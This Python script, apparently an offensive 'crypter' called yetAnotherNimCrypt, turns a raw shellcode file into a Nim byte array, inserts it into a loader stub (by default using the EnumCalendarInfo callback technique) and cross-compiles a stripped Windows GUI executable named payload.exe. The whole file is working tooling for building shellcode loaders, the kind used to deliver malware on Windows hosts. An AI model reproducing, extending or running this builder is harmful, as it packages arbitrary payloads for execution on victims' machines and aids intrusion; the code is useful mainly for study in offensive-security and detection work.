#!/usr/bin/env python3
"""
yetAnotherNimCrypt by xl00t

Usage:
  yetAnotherNimCrypt.py <shellcode_path> [--key=<key>] [--output=<output>] [--technique=<technique>]


Options:
  -h --help     Show this screen.
  -V --version     Show version.
"""

from docopt import docopt
import os
import shutil
import subprocess
import sys

CWD = os.path.join(os.path.dirname(__file__))

def convert_shellcode(shellcode_path):
    try:
        raw_shellcode = open(shellcode_path, 'rb').read()
        formated_shellcode = f"var buf: array[{len(raw_shellcode)}, byte] = ["
        for i in range(0, len(raw_shellcode)):
            formated_shellcode += f"{raw_shellcode[i]},"

        # Delete last ','
        formated_shellcode = formated_shellcode[:-1]
        formated_shellcode += '\n]\n'
        print("[+] Formated shellcode")
        return formated_shellcode
    
    except Exception as e:
        print("[-] Invalid shellcode path")

        sys.exit(1)

def write_shellcode_template(technique, formated_shellcode):
    try:
        shutil.copyfile(f"{CWD}/stubs/{technique}.nim", f"{CWD}/build/tmp.nim")
        shellcode_template_updated =  open(f"{CWD}/build/tmp.nim", 'r').read().replace('SHELLCODE_PLACEHOLDER', formated_shellcode)
        
        open(f"{CWD}/build/tmp.nim", 'w').write(shellcode_template_updated)
        print(f"[+] Shellcode template updated using technique: {technique}")
    except:
        print("[-] Invalid Technique")
        sys.exit(1)

def compile_shellcode_loader(output_path):
    subprocess.run(["nim", "c", "--app:gui", "--cpu:amd64", "--os:windows", "--gcc.exe:x86_64-w64-mingw32-gcc", "--gcc.linkerexe:x86_64-w64-mingw32-gcc", "-d:release", "-d:strip", "--opt:size", "--stdout:on", f"-o:{output_path}", f"{CWD}/build/tmp.nim"], stdout=subprocess.DEVNULL)
    print("[+] Shellcode loader compiled")

if __name__ == '__main__':
    arguments = docopt(__doc__, version='yetAnotherNimCrypt 0.1')
    
    technique = "EnumCalendarInfo" if not arguments["--technique"] else arguments["--technique"]
    output_path = "./payload.exe" if not arguments["--output"]  else arguments["--output"]

    shellcode_path = arguments["<shellcode_path>"]
    formated_shellcode = convert_shellcode(shellcode_path)
    write_shellcode_template(technique, formated_shellcode)
    compile_shellcode_loader(output_path)
